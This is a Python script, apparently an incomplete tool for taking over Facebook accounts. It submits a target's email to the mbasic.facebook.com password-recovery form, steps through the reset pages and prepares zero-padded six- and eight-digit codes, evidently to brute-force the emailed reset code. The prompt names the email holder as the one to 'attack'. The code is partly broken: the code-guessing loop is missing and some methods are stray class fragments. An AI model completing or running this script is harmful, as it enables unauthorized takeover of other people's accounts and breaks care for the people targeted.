import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def passcode6(pass0):
  pass1 = int(pass0)
  pass2 = int(pass0)
  if pass1 < 10**5 and pass1 > 9999:
    pass2 = str(pass1)
    h = ""
    code = ("0", str(pass2))
    yo = h.join(code)
  elif pass1 < 10**4 and pass1 > 999:
    h = ""
    code = ("00", str(pass2))
    yo = h.join(code)
  elif pass1 < 10**3 and pass1 > 99:
    h = ""
    code = ("000", str(pass2))
    yo = h.join(code)
  elif pass1 < 10**2 and pass1 > 9:
    h = ""
    code = ("0000", str(pass2))
    yo = h.join(code)
  elif pass1 < 10 and pass1 >= 0:
    h = ""
    code = ("00000", str(pass2))
    yo = h.join(code)
  elif pass1 < 0 :
    pass1 = 999999
    yo = str(pass1)
  else:
    yo = str(pass1)
  return yo

def passcode8(pass0):
  pass1 = int(pass0)
  pass2 = int(pass0)
  """8"""
  if pass1 < 10**7 and pass1 > 999999:
    pass2 = str(pass1)
    h = ""
    code = ("0", str(pass2))
    yo = h.join(code)
    """7"""
  elif pass1 < 10**6 and pass1 > 99999:
    pass2 = str(pass1)
    h = ""
    code = ("00", str(pass2))
    yo = h.join(code)
  elif pass1 < 10**5 and pass1 > 9999:
    pass2 = str(pass1)
    h = ""
    code = ("000", str(pass2))
    yo = h.join(code)
  elif pass1 < 10**4 and pass1 > 999:
    pass2 = str(pass1)
    h = ""
    code = ("0000", str(pass2))
    yo = h.join(code)
  elif pass1 < 10**3 and pass1 > 99:
    pass2 = str(pass1)
    h = ""
    code = ("00000", str(pass2))
    yo = h.join(code)
  elif pass1 < 10**2 and pass1 > 9:
    pass2 = str(pass1)
    h = ""
    code = ("000000", str(pass2))
    yo = h.join(code)
  elif pass1 < 10 and pass1 >= 0:
    pass2 = str(pass1)
    h = ""
    code = ("0000000", str(pass2))
    yo = h.join(code)
  else:
    yo = str(pass1)
  return yo

def fb_hack(email, codex):
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
  browser.select_form(nr=0)
  browser.form['email'] = email
  browser.submit()
  """selection confirmation"""
  browser.select_form(nr=0)
  browser.submit()
  browser.select_form(nr=0)
  browser.submit()
  browser.select_form(nr=0)
  browser.submit()
  """reset code input"""
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  xx = soup.find(id='n')
  print(soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long."))

os.system('clear')
ehack = input('Email address or username to attack:')
reset = input('Code: ') or 99999999
x = fb_hack(ehack, reset)
print("pop")
